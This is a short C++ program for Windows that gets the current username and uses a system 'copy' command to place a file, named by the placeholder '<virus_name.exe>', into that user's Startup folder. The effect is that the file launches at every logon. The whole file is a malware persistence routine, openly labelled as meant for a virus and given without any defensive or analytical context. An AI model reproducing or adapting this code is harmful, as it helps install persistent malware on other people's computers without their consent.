#include <windows.h>
#include <Lmcons.h>
#include <iostream>
#include <filesystem>
#include <string>

using namespace std;

int main() {

	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);

	string file_name = "<virus_name.exe>";//<-------------------------

	cout << username;
	string const put = "copy \"" + file_name + "\"  \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
	cout << put;

	system(put.c_str());
}
